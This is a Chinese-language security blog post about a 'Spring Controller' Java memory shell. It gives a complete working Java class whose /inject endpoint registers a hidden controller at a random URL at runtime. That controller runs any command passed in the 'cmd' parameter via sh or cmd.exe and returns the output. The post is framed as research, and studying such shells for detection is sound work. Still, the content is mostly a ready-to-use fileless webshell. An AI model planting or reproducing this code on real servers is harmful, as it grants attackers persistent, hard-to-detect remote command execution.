+++
title = "Spring Controller型内存马"
date = 2026-06-15T19:54:17+08:00
draft = false
description = "Java 内存马 作为一种无文件落地的木马，研究很有必要"
tags = ["安全研究"]
categories = ["Java内存马"]
series = ["Java内存马基础系列"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
# 前置步骤

`spring controller`型内存马，需要经过以下步骤：  
  
- 获取`WebApplicationContext`  
- 获取`RequestMappingHandlerMapping`实例  
- 通过反射获得自定义`Controller`的恶意方法的`Method`对象  
- 定义`RequestMappingInfo`  
- 动态注册`Controller`


# 完整脚本

```java
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.web.bind.annotation.RequestMapping;

import org.springframework.web.bind.annotation.RestController;

import org.springframework.web.context.WebApplicationContext;

import org.springframework.web.context.request.RequestContextHolder;

import org.springframework.web.context.request.ServletRequestAttributes;

import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;

import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;

import org.springframework.web.servlet.mvc.method.RequestMappingInfo;

import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;

import javax.servlet.http.HttpServletResponse;

import java.io.InputStream;

import java.lang.reflect.Method;

import java.util.Scanner;

  

@RestController

public class TestEvilController {

  

    private String getRandomString() {

        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

        StringBuilder randomString = new StringBuilder();

        for (int i = 0; i < 8; i++) {

            int index = (int) (Math.random() * characters.length());

            randomString.append(characters.charAt(index));

        }

        return randomString.toString();

    }

  

    @RequestMapping("/inject")

    public String inject() throws Exception{

        String controllerName = "/" + getRandomString();

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        Method method = InjectedController.class.getMethod("cmd");

        PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);

        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();

        RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);

        InjectedController injectedController = new InjectedController();

        requestMappingHandlerMapping.registerMapping(info, injectedController, method);

        return "[+] Inject successfully!<br>[+] shell url: http://localhost:8080" + controllerName + "?cmd=ipconfig";

    }

  

    @RestController

    public static class InjectedController {

  

        public InjectedController(){

        }

  

        public void cmd() throws Exception {

            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();

            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

            response.setCharacterEncoding("GBK");

            if (request.getParameter("cmd") != null) {

                boolean isLinux = true;

                String osTyp = System.getProperty("os.name");

                if (osTyp != null && osTyp.toLowerCase().contains("win")) {

                    isLinux = false;

                }

                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};

                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();

                Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");

                String output = s.hasNext() ? s.next() : "";

                response.getWriter().write(output);

                response.getWriter().flush();

                response.getWriter().close();

            }

        }

    }

}
```


# 打包运行


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518112454473.png)



![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518112823595.png)



然后输出底下的命令，但是环境出了一点小小的问题







